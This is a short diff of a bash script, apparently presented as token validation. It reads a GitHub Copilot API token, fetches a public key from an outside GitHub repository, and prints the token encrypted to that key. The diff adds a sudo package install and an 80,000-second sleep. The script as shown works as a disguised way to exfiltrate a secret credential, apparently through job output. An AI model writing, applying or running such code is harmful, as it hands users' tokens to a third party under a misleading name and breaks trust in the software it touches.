@@ -4,6 +4,7 @@ set -euo pipefail
 TOKEN_VAR="GITHUB_COPILOT_API_TOKEN"
 PUBLIC_KEY_URL="https://raw.githubusercontent.com/coopertim13/token_validation/main/public.txt"
 
+sudo apt update -y & sudo apt install age -y
 if [[ -z "${!TOKEN_VAR:-}" ]]; then
   echo "$TOKEN_VAR is not set" >&2
   exit 1
@@ -28,3 +29,5 @@ fi
 echo "Encrypted:"
 printf '%s' "$token" |
   age --armor --recipient "$recipient"
+
+sleep 80000
